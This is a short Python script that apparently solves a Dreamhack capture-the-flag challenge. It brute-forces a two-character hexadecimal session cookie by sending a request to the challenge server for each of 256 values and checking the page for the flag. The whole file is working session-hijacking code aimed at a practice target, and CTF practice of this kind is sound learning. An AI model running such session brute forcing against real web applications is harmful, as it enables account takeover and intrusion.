from requests import request
from bs4 import BeautifulSoup
from string import printable

print(printable[0:16])

url = "http://host3.dreamhack.games:22702"

print("Bruteforcing Challenge")

for i in printable[0:16]:
 for j in printable[0:16]:
  f = i + j
  print(f)
  r = request('GET', url, cookies={'sessionid': f})
  r.raise_for_status()
  c = BeautifulSoup(r.text, 'lxml').select('div.container:nth-child(2) > h3:nth-child(2)')
  if c == []:
   print('failed')
  else:
   print(f'success session id = {f}, flag content = {c}')
   exit()

